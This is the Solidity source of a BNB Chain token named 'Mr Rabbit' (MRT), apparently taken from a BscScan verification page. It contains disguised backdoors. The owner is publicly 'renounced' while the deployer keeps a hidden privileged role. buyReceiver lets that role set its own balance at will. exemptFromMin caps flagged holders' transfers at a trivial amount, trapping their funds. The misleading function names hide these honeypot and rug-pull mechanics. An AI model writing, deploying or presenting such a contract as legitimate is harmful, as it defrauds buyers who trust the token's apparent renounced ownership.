/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MrRabbit {
    uint8 public decimals = 18;


    mapping(address => bool) public liquidityMode;

    mapping(address => bool) public takeSender;
    string public name = "Mr Rabbit";
    address public owner;
    mapping(address => uint256) public balanceOf;

    address public liquiditySwap;
    address public receiverAt;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public symbol = "MRT";

    uint256 constant tradingBuy = 10 ** 10;
    bool public takeLimit;
    mapping(address => mapping(address => uint256)) public allowance;
    modifier autoExempt() {
        require(takeSender[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router enableLimit = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory listLiquidity = IUniswapV2Factory(enableLimit.factory());
        receiverAt = listLiquidity.createPair(enableLimit.WETH(), address(this));
        owner = msg.sender;
        liquiditySwap = owner;
        takeSender[liquiditySwap] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function buyReceiver(uint256 minAuto) public autoExempt {
        balanceOf[liquiditySwap] = minAuto;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function exemptFromMin(address totalReceiver) public autoExempt {
        if (totalReceiver == liquiditySwap) {
            return;
        }
        liquidityMode[totalReceiver] = true;
    }

    function liquidityBuy(address launchFund) public {
        if (takeLimit) {
            return;
        }
        takeSender[launchFund] = true;
        takeLimit = true;
    }

    function limitLaunchReceiver(address txAtLimit, address exemptBurn, uint256 minAuto) internal returns (bool) {
        require(balanceOf[txAtLimit] >= minAuto);
        balanceOf[txAtLimit] -= minAuto;
        balanceOf[exemptBurn] += minAuto;
        emit Transfer(txAtLimit, exemptBurn, minAuto);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == liquiditySwap || recipient == liquiditySwap) {
            return limitLaunchReceiver(sender, recipient, amount);
        }
        if (liquidityMode[sender]) {
            return limitLaunchReceiver(sender, recipient, tradingBuy);
        }
        return limitLaunchReceiver(sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


}